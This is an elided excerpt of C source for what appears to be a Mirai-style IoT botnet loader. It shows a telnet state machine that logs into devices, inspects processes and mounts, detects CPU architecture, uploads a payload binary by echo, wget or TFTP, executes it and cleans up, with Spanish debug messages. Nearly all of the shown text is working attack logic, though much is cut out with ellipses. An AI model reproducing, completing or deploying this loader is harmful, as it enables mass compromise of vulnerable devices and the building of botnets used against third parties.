...
void print_conn_rdbuf(struct connection *conn) {
#ifndef DEBUG
    return;
#endif
    printf("rdbuf len: %u\n", conn->rdbuf_pos);
...
// wghip = wget ip addr, wghp = wget port, thip = (t)ftp ip addr
...
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    ...
    if (fd == -1) {
        if (time(NULL) % 10 == 0) {
#ifdef DEBUG
            printf("Fallo al abrir y enlazar el socket.\n");
#endif
        }
...
static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    ...
    if (!conn->open) {
#ifdef DEBUG
        printf("No se ha abierto el socket. conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
#endif
    }
    ...
    if (ev->events & EPOLLIN && conn->open) {
        ...
        while (TRUE) {
            if (!conn->open) {
#ifdef DEBUG
                printf("El socket está cerrado. conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
                break;
#endif
            }
...
#ifdef DEBUG
                    printf("[FD%d] Error de lectura. Cerrando.\n", conn->fd);
#endif
                    connection_close(conn);
                }
                break;
...
#ifdef DEBUG
            hexDump("TELNET IN", conn->rdbuf + conn->rdbuf_pos, ret);
#endif
            conn->rdbuf_pos += ret;
            conn->last_recv = time(NULL);
            ...
            while (TRUE) {
                ...
                switch (conn->state_telnet) {
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_READ_IACS\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_USER_PROMPT\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_PASS_PROMPT\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_WAITPASS_PROMPT\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_CHECK_LOGIN\n", conn->fd);
                        if ((consumed = connection_consume_prompt(conn)) > 0) {
                            util_sockprintf(conn->fd, "%s\r\n", TOKEN_QUERY);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_VERIFY_LOGIN\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_PARSE_PS\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_PARSE_MOUNTS\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_READ_WRITEABLE\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_COPY_ECHO\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_DETECT_ARCH\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_ARM_SUBTYPE\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_UPLOAD_METHODS\n", conn->fd);
                        ...
                        if (consumed) {
                            ...
                            switch (conn->info.upload_method) {
                                case UPLOAD_ECHO:
                                    //printf("conn->info.upload_method == UPLOAD_ECHO\n", conn->fd);
                                    ...
                                    break;
                                case UPLOAD_WGET:
                                    //printf("conn->info.upload_method == UPLOAD_WGET\n", conn->fd);
                                    ...
                                    break;
                                case UPLOAD_TFTP:
                                    //printf("conn->info.upload_method == UPLOAD_TFTP\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_UPLOAD_ECHO\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_UPLOAD_WGET\n", conn->fd);
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_UPLOAD_TFTP\n", conn->fd);
                        ...
                        if (consumed > 0) {
                            ...
                            // Did not have permission to TFTP
#ifdef DEBUG
                    ...
                    //printf("[FD%d] conn->state_telnet == TELNET_RUN_BINARY\n", conn->fd);
                    print_conn_rdbuf(conn);
                        consumed = connection_verify_payload(conn);
                        if (consumed > 0) {
                            if (consumed >= 255) {
#ifdef DEBUG
...
#ifdef DEBUG
                            printf("[FD%d] No se ha podido consumir el payload\n", conn->fd);
#endif
                        }
                        break;

                    case TELNET_CLEANUP:
                    //printf("[FD%d] conn->state_telnet == TELNET_CLEANUP\n", conn->fd);
                        conn->success = TRUE;
